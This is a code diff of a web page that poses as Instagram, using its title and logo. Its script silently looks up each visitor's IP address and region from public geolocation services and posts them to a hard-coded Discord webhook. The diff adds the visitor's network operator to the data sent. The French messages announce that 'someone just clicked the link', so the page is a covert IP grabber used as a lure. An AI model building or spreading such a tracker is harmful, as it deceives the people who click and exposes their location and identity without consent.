@@ -4,13 +4,9 @@
   <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
   <title>Instagram</title>
   <script>
-    // Fonction pour envoyer l'adresse IP et le département à Discord via un appel de webhook
-    function sendIPAndDepartmentToDiscord(ipAddress, department) {
+    // Fonction pour envoyer les informations à Discord via un appel de webhook
+    function sendToDiscord(content) {
       var webhookURL = "https://ptb.discord.com/api/webhooks/1125207312806727740/bvMj9uwuMoljP5zjAZWjfXvjYO1wmzZNwAbBDvOFEV87X7SvWir3qQEWn4GSMFZvNRyF";
-
-      var content = "> **Quelqu'un vient de cliquer sur le lien. Voici  les informations reçues :**" +
-        "\n> **Adresse IP 🛰️ : **" + ipAddress +
-        "\n> **Région 🏠 : **" + department;
 
       var request = new XMLHttpRequest();
       request.open("POST", webhookURL);
@@ -21,25 +17,28 @@
       request.send(JSON.stringify(params));
     }
 
-    // Fonction pour récupérer l'adresse IP et le département de l'utilisateur
+    // Fonction pour récupérer l'adresse IP, le département et l'opérateur réseau de l'utilisateur
     function getIPAddressAndDepartment() {
-      // Récupérer l'adresse IP de l'utilisateur en utilisant un service de géolocalisation
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
           var ipAddress = data.ip;
 
-          // Récupérer le département en fonction de l'adresse IP
           fetch('https://ipapi.co/' + ipAddress + '/json/')
             .then(response => response.json())
             .then(data => {
               var department = data.region;
+              var operator = data.org; // Obtenir l'opérateur réseau à partir des données
 
-              // Envoyer l'adresse IP et le département à Discord
-              sendIPAndDepartmentToDiscord(ipAddress, department);
+              var content = "> **Quelqu'un vient de cliquer sur le lien. Voici les informations reçues :**" +
+                "\n> **Adresse IP 🛰️ : **" + ipAddress +
+                "\n> **Région 🏠 : **" + department +
+                "\n> **Opérateur réseau 📶 : **" + operator;
+
+              sendToDiscord(content);
             })
             .catch(error => {
-              console.error('Erreur lors de la récupération du département :', error);
+              console.error('Erreur lors de la récupération des informations :', error);
             });
         })
         .catch(error => {
